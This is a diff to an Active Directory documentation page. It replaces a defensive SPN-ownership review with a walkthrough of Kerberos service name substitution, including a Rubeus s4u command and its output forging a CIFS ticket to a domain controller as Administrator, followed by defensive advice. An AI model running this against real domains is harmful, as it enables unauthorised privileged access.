@@ -1,55 +1,86 @@
 ---
-title: "Exploiting Kerberos Service Name Substitution: SPN Ownership Review"
+title: "Service Name Substitution"
 date: 2026-09-25
 weight: 6
 type: docs
 tags:
   - Kerberos
-  - SPN
+  - Constrained Delegation
+  - Service Name Substitution
   - Active Directory
 ---
 
-A Kerberos ticket carries a service name as well as encrypted ticket data. A service-name substitution issue can arise when two service names resolve to services running under the same account key. The target service may then be able to decrypt ticket data even though the KDC issued the ticket for a different service name. This is conditional on key ownership and service behavior; it is not a general way to change a ticket into access to any host.
+## What service name substitution is
 
-## 1. Identify the allowed and adjacent SPNs
+Service name substitution is a technique that lets an adversary "swap" a service ticket issued for one service so that it works against a different service. That phrasing sounds odd at first, so it is worth unpacking why it is possible.
 
-Start with the exact SPN recorded in a constrained-delegation review. Query both the configured SPN and any proposed alias so the directory owner can compare their account owners:
+Both the AS-REP and the TGS-REP messages are built on the same underlying structure, `KDC-REP`. What actually sits inside the `ticket[5]` and `enc-part[6]` fields depends on which reply is being sent; for a TGS-REP those are a service ticket and an `EncTGSRepPart` respectively.
 
-```cmd
-setspn.exe -Q HTTP/api-srv-02.northwind.example
-setspn.exe -Q cifs/api-srv-02.northwind.example
+The Ticket structure carries its own encrypted section, holding details such as the principal the ticket was issued to and a copy of the service session key. The important observation is that the SPN itself, the `sname[2]` field, is *not* part of that encrypted section.
+
+Because that field sits in the clear, an adversary who holds a service ticket for, say, HTTP/PC1 can overwrite it with a different SPN such as CIFS/PC1. The ticket remains valid, because `sname` is also excluded from the ticket's checksum, so tampering with it leaves the integrity check intact.
+
+There is one firm constraint. Substitution only works when the replacement SPN runs under the same account as the original service. You can turn HTTP/PC1 into CIFS/PC1, but you cannot turn HTTP/PC1 into CIFS/PC2. The reason is cryptographic: when two services share a single account, the session keys inside their tickets are protected with the same key. The substituted service can therefore decrypt the ticket without any trouble, even though the KDC never issued a TGS-REP for that particular SPN.
+
+## Where it pays off
+
+This trick is especially valuable in constrained delegation, where the service you are permitted to delegate to is not, on its own, much use for lateral movement. Consider a case where *hq-wks-07* is allowed to delegate only to the TIME service on *hq-dc-02*:
+
+```powershell
+sAMAccountName: HQ-WKS-07$
+msDS-AllowedToDelegateTo: time/hq-dc-02.arcadia.local, time/hq-dc-02
 ```
 
-Example output:
+On paper that is a dead end. TIME, unlike CIFS, does not hand you remote access to the machine. Service name substitution changes the calculation entirely: you request a ticket for TIME as allowed, then rewrite the service name in the returned ticket from TIME to CIFS, or to whatever else is useful. Rubeus exposes this through the `/altservice` parameter.
 
-```text
-Checking domain DC=northwind,DC=example
-CN=API Service,OU=Service Accounts,DC=northwind,DC=example
-        HTTP/api-srv-02.northwind.example
-Existing SPN found!
+The walkthrough below assumes protocol transition is enabled.
 
-Checking domain DC=northwind,DC=example
-CN=API Service,OU=Service Accounts,DC=northwind,DC=example
-        cifs/api-srv-02.northwind.example
-Existing SPN found!
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:hq-wks-07$ /msdsspn:time/hq-dc-02 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
 ```
 
-If both names resolve to the same principal, record that as a potential service-boundary concern and confirm which services actually run under the account. Different owners, duplicate SPNs, aliases, and port-qualified SPNs change the analysis.
+Where:
 
-## 2. Explain the delegation risk
+- `/user` is the principal (typically a computer) that carries the delegation.
+- `/msdsspn` is the service the principal is permitted to delegate to.
+- `/altservice` is the service to substitute into the final ticket.
+- `/ticket` is the principal's TGT.
+- `/impersonateuser` is the user to impersonate.
 
-### Exploiting service-name substitution
+`/altservice` will also accept a comma-separated list, for example `/altservice:cifs,host,http`, which produces three ready-to-inject tickets in one pass.
 
-When a configured delegation target is a low-utility service, an attacker may look for another service name protected by the same account key. That could widen the impact of an otherwise narrow delegation entry. The condition is account-key equivalence, not merely that two SPNs share a hostname.
+```powershell
+[*] Action: S4U
 
-Do not request an impersonated-user ticket or alter a ticket's service name to demonstrate the issue. Use SPN ownership, service configuration, delegation attributes, and the backend ACL to show the possible boundary crossing. Treat this as a configuration risk until a separately authorized disposable lab verifies behavior.
+[*] Building S4U2self request for: 'HQ-WKS-07$@ARCADIA.LOCAL'
+[*] Using domain controller: hq-dc-02.arcadia.local (172.16.40.10)
+[*] Sending S4U2self request to 172.16.40.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'HQ-WKS-07$@ARCADIA.LOCAL'
+[*] base64(ticket.kirbi):
 
-## 3. Correct the service boundary
+      doIF8[...snip...]MtMSQ=
 
-Assign services to appropriately separated accounts where practical. Remove stale or duplicate SPNs through the directory change process, review delegation targets, and verify the application after change. Monitor unexpected SPN registration and changes to service account ownership.
+[*] Impersonating user 'Administrator' to target SPN 'time/hq-dc-02'
+[*]   Final ticket will be for the alternate service 'cifs'
+[*] Building S4U2proxy request for service: 'time/hq-dc-02'
+[*] Using domain controller: hq-dc-02.arcadia.local (172.16.40.10)
+[*] Sending S4U2proxy request to domain controller 172.16.40.10:88
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi) for SPN 'cifs/hq-dc-02':
+
+      doIGf[...snip...]RjLTE=
+```
+
+The resulting ticket is a CIFS ticket for *hq-dc-02*, despite the delegation policy only ever permitting TIME. From here it can be injected and used exactly like any other CIFS ticket to reach the target's file system.
+
+## Defensive considerations
+
+The uncomfortable takeaway for defenders is that an entry in `msDS-AllowedToDelegateTo` cannot be judged safe merely because the named service looks harmless. Because the SPN is interchangeable across services on the same account, delegation to a benign service such as TIME is effectively delegation to every service that account hosts, CIFS and HOST included. Review delegation grants with that in mind, and treat any constrained delegation to a domain controller or other tier-0 host as high risk regardless of the specific SPN listed. Where protocol transition is enabled on such an account, the exposure is greater still, since the attacker can select the impersonated user freely; disable it unless there is a clear, documented need. As a detection aid, S4U2proxy activity that is immediately followed by a service-name substitution is a strong signal, as legitimate applications request the service they actually intend to use.
 
 ## Further reading
 
-- [Microsoft Open Specifications: S4U overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/36d103d2-61a6-42d5-a725-74de3205cdaf)
-- [Microsoft Learn: setspn command reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn)
-- [Microsoft Learn: Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [Microsoft Open Specifications: S4U2proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a)
+- [Microsoft Open Specifications: KDC-REP structure](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
+- [GhostPack Rubeus documentation](https://github.com/GhostPack/Rubeus)
